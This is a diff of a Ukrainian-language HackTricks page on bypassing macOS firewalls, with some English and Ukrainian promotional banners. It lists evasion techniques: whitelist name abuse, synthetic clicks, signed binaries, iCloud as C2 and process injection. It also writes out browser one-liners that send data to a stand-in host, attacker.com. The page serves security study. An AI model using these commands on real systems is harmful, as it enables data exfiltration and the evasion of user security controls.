@@ -1,57 +1,57 @@
-# Обхід брандмауерів macOS
+# macOS Bypassing Firewalls
 
 {% hint style="success" %}
-Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа хакінгу HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа хакінгу HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Підтримайте HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## Знайдені техніки
 
-Наступні техніки були виявлені як працюючі в деяких додатках брандмауерів macOS.
+Наступні техніки були виявлені в деяких програмах брандмауера macOS.
 
-### Зловживання іменами білого списку
+### Зловживання іменами у білому списку
 
-* Наприклад, назви шкідливих програм можуть бути викликані іменами відомих процесів macOS, таких як **`launchd`**
+* Наприклад, викликати шкідливе ПЗ з іменами відомих процесів macOS, таких як **`launchd`**
 
 ### Синтетичний клік
 
-* Якщо брандмауер запитує дозвіл від користувача, шкідлива програма може **клацнути на дозвіл**
+* Якщо брандмауер запитує дозвіл у користувача, змусьте шкідливе ПЗ **натиснути на дозволити**
 
-### Використання підписаних бінарних файлів Apple
+### **Використовуйте підписані Apple двійкові файли**
 
-* Наприклад, **`curl`**, а також інші, такі як **`whois`**
+* Як **`curl`**, але також інші, такі як **`whois`**
 
 ### Відомі домени Apple
 
-Брандмауер може дозволяти підключення до відомих доменів Apple, таких як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.
+Брандмауер може дозволяти з'єднання з відомими доменами Apple, такими як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.
 
 ### Загальний обхід
 
-Деякі ідеї для спроб обійти брандмауери
+Деякі ідеї для спроби обійти брандмауери
 
 ### Перевірка дозволеного трафіку
 
-Знання дозволеного трафіку допоможе вам визначити потенційно включені в білий список домени або додатки, які мають до них доступ.
+Знання дозволеного трафіку допоможе вам виявити потенційно включені в білий список домени або які програми мають доступ до них.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Зловживання DNS
 
-DNS-розрішення виконується за допомогою підписаної програми **`mdnsreponder`**, яка, ймовірно, буде дозволена звертатися до DNS-серверів.
+DNS-резолюції виконуються через **`mdnsreponder`** підписаний додаток, який, ймовірно, буде дозволено контактувати з DNS-серверами.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Через програми браузера
+### Через браузерні додатки
 
 * **oascript**
 ```applescript
@@ -74,13 +74,13 @@ end tell
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-* Сафарі
+* Safari
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Через внедрення процесів
+### Через ін'єкції процесів
 
-Якщо ви можете **впровадити код в процес**, який має дозвіл на підключення до будь-якого сервера, ви можете обійти захист брандмауера:
+Якщо ви можете **впровадити код у процес**, який має право підключатися до будь-якого сервера, ви можете обійти захист брандмауера:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -89,3 +89,18 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ## Посилання
 
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+
+{% hint style="success" %}
+Вчіться та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вчіться та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Підтримати HackTricks</summary>
+
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
+
+</details>
+{% endhint %}
